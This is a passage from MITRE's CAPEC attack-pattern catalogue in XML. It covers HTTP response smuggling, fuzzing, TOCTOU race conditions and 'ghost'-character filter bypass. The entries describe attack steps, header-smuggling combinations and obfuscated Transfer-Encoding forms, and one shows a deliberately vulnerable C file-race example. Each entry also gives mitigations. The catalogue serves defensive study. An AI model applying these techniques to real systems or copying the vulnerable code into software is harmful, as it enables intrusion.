            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="63" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="593" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="148" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="154" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targets.</ns0:Description>
               <ns0:Technique>Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure to intended targets in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, message sizes, and HTTP headers.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Cause differential HTTP responses by experimenting with identified HTTP Response vulnerabilities] The adversary sends maliciously crafted HTTP request to back-end HTTP infrastructure to inject adversary data into HTTP responses (intended for intermediary and/or front-end client/victim HTTP agents communicating with back-end HTTP infrastructure) for the purpose of interfering with the parsing of HTTP response. The intended consequences of the malicious HTTP request and the subsequent adversary injection and manipulation of HTTP responses will be observed to confirm applicability of identified vulnerabilities in the adversary's plan of attack.</ns0:Description>
               <ns0:Technique>Continue the monitoring of HTTP traffic.</ns0:Technique>
               <ns0:Technique>
                  <html:p>Inject additional HTTP headers to utilize various combinations of HTTP Headers within a single HTTP message such as: Content-Length &amp; Transfer-Encoding (CL;TE), Transfer-Encoding &amp; Content-Length (TE;CL), or double Transfer-Encoding (TE;TE), so that additional embedded message or data in the body of the original message are unprocessed and treated as part of subsequent messages by the intended target HTTP agent.</html:p>
                  <html:p>From these HTTP Header combinations the adversary observes any timing delays (usually in the form of HTTP 404 Error response) or any other unintended consequences.</html:p>
                  <html:ul>
                     <html:li>For CL;TE and TE;CL HTTP headers combination, the first HTTP agent, in the HTTP message path that receives the HTTP message, takes precedence or only processes the one header but not the other, while the second/final HTTP agent processes the opposite header allowing for embedded HTTP message to be ignored and smuggled to the intended target HTTP agent.</html:li>
                     <html:li>For TE;TE HTTP headers combination, all HTTP agents in HTTP message path process Transfer-Encoding header, however, adversary obfuscation of one of the Transfer-Encoding headers, by not adhering strictly to the protocol specification, can cause it to be unprocessed/ignored by a designated HTTP agent, hence allowing embedded HTTP messages to be smuggled. See Mitigations for details.</html:li>
                  </html:ul>
               </ns0:Technique>
               <ns0:Technique>
                  <html:p>Construct a very large HTTP message via multiple Content-Length headers of various data lengths that can potentially cause subsequent messages to be ignored by an intermediary HTTP agent (e.g., firewall) and/or eventually parsed separately by the target HTTP agent.</html:p>
                  <html:p>Note that most modern HTTP infrastructure reject HTTP messages with multiple Content-Length headers.</html:p>
               </ns0:Technique>
               <ns0:Technique>Monitor HTTP traffic using a tool such as a Network Protocol Analyzer.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Perform HTTP Response Smuggling attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.</ns0:Description>
               <ns0:Technique>Leverage techniques identified in the Experiment Phase.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>A vulnerable or compromised server or domain/site capable of allowing adversary to insert/inject malicious content that will appear in the server's response to target HTTP agents (e.g., proxies and users' web browsers).</ns0:Prerequisite>
            <ns0:Prerequisite>Differences in the way the two HTTP agents parse and interpret HTTP responses and its headers.</ns0:Prerequisite>
            <ns0:Prerequisite>HTTP agents running on HTTP/1.1 that allow for Keep Alive mode, Pipelined queries, and Chunked queries and responses.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">Detailed knowledge on HTTP protocol: request and response messages structure and usage of specific headers.</ns0:Skill>
            <ns0:Skill Level="Medium">Detailed knowledge on how specific HTTP agents receive, send, process, interpret, and parse a variety of HTTP messages and headers.</ns0:Skill>
            <ns0:Skill Level="Medium">Possess knowledge on the exact details in the discrepancies between several targeted HTTP agents in path of an HTTP message in parsing its message structure and individual headers.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>Tools capable of monitoring HTTP messages, and crafting malicious HTTP messages and/or injecting malicious content into HTTP messages.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Indicators>
            <ns0:Indicator>Differences in responses processed by the two agents. This requires careful monitoring or a capable log analysis tool.</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: evaluate HTTP agents prior to deployment for parsing/interpretation discrepancies.</ns0:Mitigation>
            <ns0:Mitigation>Configuration: front-end HTTP agents notice ambiguous requests.</ns0:Mitigation>
            <ns0:Mitigation>Configuration: back-end HTTP agents reject ambiguous requests and close the network connection.</ns0:Mitigation>
            <ns0:Mitigation>Configuration: Disable reuse of back-end connections.</ns0:Mitigation>
            <ns0:Mitigation>Configuration: Use HTTP/2 for back-end connections.</ns0:Mitigation>
            <ns0:Mitigation>Configuration: Use the same web server software for front-end and back-end server.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Utilize a Web Application Firewall (WAF) that has built-in mitigation to detect abnormal requests/responses.</ns0:Mitigation>
            <ns0:Mitigation>Configuration: Prioritize Transfer-Encoding header over Content-Length, whenever an HTTP message contains both.</ns0:Mitigation>
            <ns0:Mitigation>Configuration: Disallow HTTP messages with both Transfer-Encoding and Content-Length or Double Content-Length Headers.</ns0:Mitigation>
            <ns0:Mitigation>Configuration: Disallow Malformed/Invalid Transfer-Encoding Headers used in obfuscation, such as:<html:ul>
                  <html:li>Headers with no space before the value &#8220;chunked&#8221;</html:li>
                  <html:li>Headers with extra spaces</html:li>
                  <html:li>Headers beginning with trailing characters</html:li>
                  <html:li>Headers providing a value &#8220;chunk&#8221; instead of &#8220;chunked&#8221; (the server normalizes this as chunked encoding)</html:li>
                  <html:li>Headers with multiple spaces before the value &#8220;chunked&#8221;</html:li>
                  <html:li>Headers with quoted values (whether single or double quotations)</html:li>
                  <html:li>Headers with CRLF characters before the value &#8220;chunked&#8221;</html:li>
                  <html:li>Values with invalid characters</html:li>
               </html:ul>
            </ns0:Mitigation>
            <ns0:Mitigation>Configuration: Install latest vendor security patches available for both intermediary and back-end HTTP infrastructure (i.e. proxies and web servers)</ns0:Mitigation>
            <ns0:Mitigation>Configuration: Ensure that HTTP infrastructure in the chain or network path utilize a strict uniform parsing process.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Utilize intermediary HTTP infrastructure capable of filtering and/or sanitizing user-input.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>When using Undertow, a Java-based web server in Red Hat's Jboss Enterprise Application Platform version 7.0, the code responsible for parsing HTTP requests permitted invalid characters, that could allow the injection of data into HTTP responses from Undertow to clients when used in tandem with a proxy; allowing for web-cache poisoning, XSS, and confidentiality violation of sensitive information from other HTTP requests sent to Undertow. See also: CVE-2017-2666</html:p>
            </ns0:Example>
            <ns0:Example>
               <html:p>Mozilla Firefox and Thunderbird before 1.5.04, with various proxy servers, interpreted HTTP responses differently if HTTP response headers included a space between the header name and colon or if HTTP 1.1 headers were sent through a proxy configured with HTTP 1.0, allowing for HTTP Smuggling vulnerability. See also: CVE-2006-2786</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="436" />
            <ns0:Related_Weakness CWE_ID="444" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>27</ns0:Entry_ID>
               <ns0:Entry_Name>HTTP Response Smuggling</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-38" />
            <ns0:Reference External_Reference_ID="REF-117" />
            <ns0:Reference External_Reference_ID="REF-675" />
            <ns0:Reference External_Reference_ID="REF-676" />
            <ns0:Reference External_Reference_ID="REF-677" />
            <ns0:Reference External_Reference_ID="REF-678" />
         </ns0:References>
         <ns0:Notes>
            <ns0:Note Type="Terminology">HTTP Splitting &#8211; "the act of forcing a sender of (HTTP) messages to emit data stream consisting of more messages than the sender&#8217;s intension. The messages sent are 100% valid and RFC compliant" [REF-117].</ns0:Note>
            <ns0:Note Type="Terminology">HTTP Smuggling &#8211; "the act of forcing a sender of (HTTP) messages to emit data stream which may be parsed as a different set of messages (i.e. dislocated message boundaries) than the sender&#8217;s intention. This is done by virtue of forcing the sender to emit non-standard messages which can be interpreted in more than one way" [REF-117].</ns0:Note>
            <ns0:Note Type="Relationship">HTTP Smuggling is an evolution of previous HTTP Splitting techniques which are commonly remediated against.</ns0:Note>
         </ns0:Notes>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns, Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Status, Alternate_Terms, Consequences, Description, Example_Instances, Execution_Flow, Extended_Description, Indicators, Likelihood_Of_Attack, Mitigations, Notes, Prerequisites, References, Related_Attack_Patterns, Resources_Required, Skills_Required, Typical_Severity</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Alternate_Terms, Extended_Description, Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="28" Name="Fuzzing" Abstraction="Meta" Status="Draft">
         <ns0:Description>In this attack pattern, the adversary leverages fuzzing to try to identify weaknesses in the system. Fuzzing is a software security and functionality testing method that feeds randomly constructed input to the system and looks for an indication that a failure in response to that input has occurred. Fuzzing treats the system as a black box and is totally free from any preconceptions or assumptions about the system. Fuzzing can help an attacker discover certain assumptions made about user input in the system. Fuzzing gives an attacker a quick way of potentially uncovering some of these assumptions despite not necessarily knowing anything about the internals of the system. These assumptions can then be turned against the system by specially crafting user input that may allow an attacker to achieve their goals.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Observe communication and inputs] The fuzzing attacker observes the target system looking for inputs and communications between modules, subsystems, or systems.</ns0:Description>
               <ns0:Technique>Network sniffing. Using a network sniffer such as wireshark, the attacker observes communications into and out of the target system.</ns0:Technique>
               <ns0:Technique>Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the attacker observes the system calls and API calls that are made by the target system, and the nature of their parameters.</ns0:Technique>
               <ns0:Technique>Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.)</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Generate fuzzed inputs] Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.</ns0:Description>
               <ns0:Technique>Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).</ns0:Technique>
               <ns0:Technique>Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Observe the outcome] Observe the outputs to the inputs fed into the system by fuzzers and see if anything interesting happens. If failure occurs, determine why that happened. Figure out the underlying assumption that was invalidated by the input.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Craft exploit payloads] Put specially crafted input into the system that leverages the weakness identified through fuzzing and allows to achieve the goals of the attacker. Fuzzers often reveal ways to slip through the input validation filters and introduce unwanted data into the system.</ns0:Description>
               <ns0:Technique>Identify and embed shell code for the target system.</ns0:Technique>
               <ns0:Technique>Embed higher level attack commands in the payload. (e.g., SQL, PHP, server-side includes, etc.)</ns0:Technique>
               <ns0:Technique>Induce denial of service by exploiting resource leaks or bad error handling.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">There is a wide variety of fuzzing tools available.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>Fuzzing tools.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Indicators>
            <ns0:Indicator>A lot of invalid data is fed to the system. Data that cannot have been generated through a legitimate transaction/request. Data is coming into the system within a short period of time and potentially from the same IP.</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Alter Execution Logic</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Test to ensure that the software behaves as per specification and that there are no unintended side effects. Ensure that no assumptions about the validity of data are made.</ns0:Mitigation>
            <ns0:Mitigation>Use fuzz testing during the software QA process to uncover any surprises, uncover any assumptions or unexpected behavior.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>A fuzz test reveals that when data length for a particular field exceeds certain length, the input validation filter fails and lets the user data in unfiltered. This provides an attacker with an injection vector to deliver the malicious payload into the system.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
         </ns0:Related_Weaknesses>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description Summary, Related_Attack_Patterns, Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="29" Name="Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions" Abstraction="Standard" Status="Draft">
         <ns0:Description>This attack targets a race condition occurring between the time of check (state) for a resource and the time of use of a resource. A typical example is file access. The adversary can leverage a file access race condition by "running the race", meaning that they would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time, the adversary could replace or modify the file, causing the application to behave unexpectedly.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="26">
               <ns0:Exclude_Related Exclude_ID="515" />
            </ns0:Related_Attack_Pattern>
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>The adversary explores to gauge what level of access they have.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>The adversary confirms access to a resource on the target host. The adversary confirms ability to modify the targeted resource.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>The adversary decides to leverage the race condition by "running the race", meaning that they would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time, the adversary can replace the resource and cause an escalation of privilege.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>A resource is access/modified concurrently by multiple processes.</ns0:Prerequisite>
            <ns0:Prerequisite>The adversary is able to modify resource.</ns0:Prerequisite>
            <ns0:Prerequisite>A race condition exists while accessing a resource.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">This attack can get sophisticated since the attack has to occur within a short interval of time.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Alter Execution Logic</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Resource Consumption</ns0:Impact>
               <ns0:Note>Denial of Service</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Use safe libraries to access resources such as files.</ns0:Mitigation>
            <ns0:Mitigation>Be aware that improper use of access function calls such as chown(), tempfile(), chmod(), etc. can cause a race condition.</ns0:Mitigation>
            <ns0:Mitigation>Use synchronization to control the flow of execution.</ns0:Mitigation>
            <ns0:Mitigation>Use static analysis tools to find race conditions.</ns0:Mitigation>
            <ns0:Mitigation>Pay attention to concurrency problems related to the access of resources.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>The Net Direct client for Linux before 6.0.5 in Nortel Application Switch 2424, VPN 3050 and 3070, and SSL VPN Module 1000 extracts and executes files with insecure permissions, which allows local users to exploit a race condition to replace a world-writable file in /tmp/NetClient and cause another user to execute arbitrary code when attempting to execute this client, as demonstrated by replacing /tmp/NetClient/client. See also: CVE-2007-1057</ns0:Example>
            <ns0:Example>
               <html:p>The following code illustrates a file that is accessed multiple times by name in a publicly accessible directory. A race condition exists between the accesses where an adversary can replace the file referenced by the name.</html:p>
               <html:div style="margin-left:1em;" class="bad">include &lt;sys/types.h&gt;<html:br />include &lt;fcntl.h&gt;<html:br />include &lt;unistd.h&gt;<html:br />
                  <html:br />define FILE "/tmp/myfile"<html:br />define UID 100<html:br />
                  <html:br />void test(char *str)<html:br />{<html:div style="margin-left:1em;">int fd;<html:br />fd = creat(FILE, 0644);<html:br />if(fd == -1)<html:div style="margin-left:1em;">return;</html:div>
                     <html:br />chown(FILE, UID, -1); /* BAD */<html:br />close(fd);</html:div>
                  <html:br />}<html:br />
                  <html:br />int main(int argc, char **argv)<html:br />{<html:div style="margin-left:1em;">char *userstr;<html:br />if(argc &gt; 1) {<html:div style="margin-left:1em;">userstr = argv[1];<html:br />test(userstr);</html:div>
                     <html:br />}<html:br />return 0;</html:div>
                  <html:br />}</html:div>
               <html:p>[REF-107]</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="367" />
            <ns0:Related_Weakness CWE_ID="368" />
            <ns0:Related_Weakness CWE_ID="366" />
            <ns0:Related_Weakness CWE_ID="370" />
            <ns0:Related_Weakness CWE_ID="362" />
            <ns0:Related_Weakness CWE_ID="662" />
            <ns0:Related_Weakness CWE_ID="691" />
            <ns0:Related_Weakness CWE_ID="663" />
            <ns0:Related_Weakness CWE_ID="665" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-131" />
            <ns0:Reference External_Reference_ID="REF-107" Section="Test Case ID 1598" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Abstraction</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances, Execution_Flow, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="3" Name="Using Leading 'Ghost' Character Sequences to Bypass Input Filters" Abstraction="Detailed" Status="Draft">
         <ns0:Description>Some APIs will strip certain leading characters from a string of parameters. An adversary can intentionally introduce leading "ghost" characters (extra characters that don't affect the validity of the request at the API layer) that enable the input to pass the filters and therefore process the adversary's input. This occurs when the targeted API will accept input data in several syntactic forms and interpret it in the equivalent semantic way, while the filter does not take into account the full spectrum of the syntactic forms acceptable to the targeted API.</ns0:Description>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.</ns0:Description>
               <ns0:Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</ns0:Technique>
               <ns0:Technique>Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</ns0:Technique>
               <ns0:Technique>Manually inspect the application to find entry points.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the "Explore" phase as a target list and injects various leading 'Ghost' character sequences to determine how to application filters them.</ns0:Description>
               <ns0:Technique>Add additional characters to common sequences such as "../" to see how the application will filter them.</ns0:Technique>
               <ns0:Technique>Try repeating special characters (?, @, #, *, etc.) at the beginning of user input to see how the application filters these out.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Bypass input filtering] Using what the adversary learned about how the application filters input data, they craft specific input data that bypasses the filter. This can lead to directory traversal attacks, arbitrary shell command execution, corruption of files, etc.</ns0:Description>
            </ns0:Attack_Step>
